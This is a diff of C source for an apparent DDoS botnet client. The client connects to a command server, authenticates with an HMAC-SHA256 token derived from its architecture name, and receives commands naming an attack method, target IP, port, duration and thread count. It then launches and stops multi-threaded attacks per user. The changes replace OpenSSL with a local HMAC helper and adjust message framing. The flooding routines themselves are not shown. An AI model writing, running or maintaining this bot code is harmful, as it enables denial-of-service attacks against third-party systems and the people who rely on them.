@@ -3,15 +3,15 @@
 #include <string.h>
 #include <time.h>
 #include <unistd.h>
+#include <sys/time.h>
 #include <pthread.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <signal.h>
-#include <openssl/hmac.h>
-#include <openssl/evp.h>
 #include "attacks.h"
 #include "config.h"
+#include "hmac.h"
 
 user_attack_t user_attacks[MAX_USERS];
 int user_count = 0;
@@ -36,63 +36,36 @@ char *get_architecture() {
     return arch;
 }
 
-int base64_decode(const char *input, unsigned char *output, int *outlen) {
-    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    int i = 0, j = 0, k = 0;
-    unsigned char temp[4];
-    *outlen = 0;
-
-    while (input[i] != '\0' && input[i] != '=') {
-        const char *pos = strchr(base64_chars, input[i]);
-        if (pos == NULL) {
-            i++;
-            continue;
-        }
-        temp[j++] = pos - base64_chars;
-        
-        if (j == 4) {
-            output[k++] = (temp[0] << 2) | (temp[1] >> 4);
-            output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
-            output[k++] = ((temp[2] & 0x03) << 6) | temp[3];
-            j = 0;
-            *outlen = k;
-        }
-        i++;
-    }
-    
-    if (j > 0) {
-        if (j >= 2) output[k++] = (temp[0] << 2) | (temp[1] >> 4);
-        if (j >= 3) output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
-        *outlen = k;
-    }
-    
-    return (*outlen > 0) ? 0 : -1;
-}
-
+// NOVA FUNÇÃO: Gera autenticação usando HMAC-SHA256
 void generate_bot_auth(const char *arch, char *auth_output) {
-    unsigned char secret[32];
-    int secret_len = 0;
-    
     if (strcmp(BOT_SECRET_B64, "CHANGE_THIS_IN_CONFIG_JSON") == 0) {
         strcpy(auth_output, "");
         return;
     }
     
-    if (base64_decode(BOT_SECRET_B64, secret, &secret_len) != 0 || secret_len != 32) {
+    // Decode base64 secret
+    uint8_t decoded_secret[64];
+    int secret_len = base64_decode(BOT_SECRET_B64, decoded_secret, sizeof(decoded_secret));
+    
+    if (secret_len <= 0) {
+        printf("[ERROR] Failed to decode bot secret\n");
         strcpy(auth_output, "");
         return;
     }
     
-    unsigned char hmac_result[EVP_MAX_MD_SIZE];
-    unsigned int hmac_len;
+    // Calculate HMAC-SHA256
+    uint8_t hmac_result[32];
+    hmac_sha256(decoded_secret, secret_len, 
+                (const uint8_t *)arch, strlen(arch), 
+                hmac_result);
     
-    HMAC(EVP_sha256(), secret, 32, (unsigned char *)arch, strlen(arch), 
-         hmac_result, &hmac_len);
-    
-    for (unsigned int i = 0; i < hmac_len; i++) {
+    // Convert to hex string
+    for (int i = 0; i < 32; i++) {
         sprintf(auth_output + (i * 2), "%02x", hmac_result[i]);
     }
-    auth_output[hmac_len * 2] = '\0';
+    auth_output[64] = '\0';
+    
+    printf("[DEBUG] Generated HMAC-SHA256 for arch '%s'\n", arch);
 }
 
 void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username) {
@@ -131,7 +104,6 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
 
     int attack_index = user_attacks[user_index].attack_count;
     
-    // Initialize attack slot
     user_attacks[user_index].attacks[attack_index].stop = 0;
     user_attacks[user_index].attacks[attack_index].active = 1;
     user_attacks[user_index].attacks[attack_index].thread_count = 0;
@@ -145,7 +117,6 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
         return;
     }
 
-    // Create attack threads
     int successful = 0;
     for (i = 0; i < thread_count && i < MAX_THREADS; i++) {
         attack_params_t *params = malloc(sizeof(attack_params_t));
@@ -190,7 +161,6 @@ void stop_attacks(const char *username) {
 
     pthread_mutex_lock(&user_mutex);
 
-    // Find user
     for (i = 0; i < user_count; i++) {
         if (strcmp(user_attacks[i].username, username) == 0) {
             user_index = i;
@@ -222,7 +192,6 @@ void stop_attacks(const char *username) {
     }
 
     pthread_mutex_unlock(&user_mutex);
-
     sleep(2);
 
     pthread_mutex_lock(&user_mutex);
@@ -234,7 +203,6 @@ void stop_attacks(const char *username) {
     }
     
     user_attacks[user_index].attack_count = 0;
-    
     pthread_mutex_unlock(&user_mutex);
     
     printf("[SUCCESS] All attacks stopped for user: %s\n", username);
@@ -258,7 +226,7 @@ void handle_command(int sock, char *buffer) {
     }
 
     if (strcmp(command, "ping") == 0) {
-        send(sock, "PONG", 4, 0);
+        send(sock, "PONG\n", 5, 0);
         printf("[INFO] Responded to PING\n");
         return;
     }
@@ -277,7 +245,6 @@ void handle_command(int sock, char *buffer) {
         return;
     }
 
-    // Parse attack parameters
     token = strtok(NULL, " ");
     if (token == NULL) {
         printf("[ERROR] Missing IP parameter\n");
@@ -313,7 +280,6 @@ void handle_command(int sock, char *buffer) {
         username[strcspn(username, "\r")] = 0;
     }
 
-    // Validate parameters
     if (port <= 0 || port > 65535) {
         printf("[ERROR] Invalid port: %d\n", port);
         return;
@@ -331,7 +297,6 @@ void handle_command(int sock, char *buffer) {
 
     start_attack(command, ip, port, duration, threads, username);
 }
-
 
 int main() {
     int sock;
@@ -379,25 +344,28 @@ int main() {
         printf("[INFO] Connected! Waiting for authentication...\n");
         sleep(1);
 
-        // Authentication
         memset(buffer, 0, BUFFER_SIZE);
         int recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
         
         if (recv_size > 0 && strstr(buffer, "Username") != NULL) {
             sleep(1);
             char *arch = get_architecture();
-            send(sock, arch, strlen(arch), 0);
+            char userbuf[128];
+            snprintf(userbuf, sizeof(userbuf), "%s\n", arch);
+            send(sock, userbuf, strlen(userbuf), 0);
             printf("[INFO] Sent username: %s\n", arch);
             
             memset(buffer, 0, BUFFER_SIZE);
             recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
 
             if (recv_size > 0 && strstr(buffer, "Password") != NULL) {
-                char auth_token[65];
+                char auth_token[128];
                 generate_bot_auth(arch, auth_token);
                 if (strlen(auth_token) > 0) {
-                    send(sock, auth_token, strlen(auth_token), 0);
-                    printf("[INFO] Authenticated successfully with HMAC\n");
+                    char passbuf[128];
+                    snprintf(passbuf, sizeof(passbuf), "%s\n", auth_token);
+                    send(sock, passbuf, strlen(passbuf), 0);
+                    printf("[INFO] Authenticated successfully\n");
                 } else {
                     printf("[ERROR] Failed to generate authentication token\n");
                     close(sock);
@@ -407,7 +375,6 @@ int main() {
             }
         }
 
-        // Command loop
         printf("[INFO] Entering command loop...\n");
         while (1) {
             memset(buffer, 0, BUFFER_SIZE);
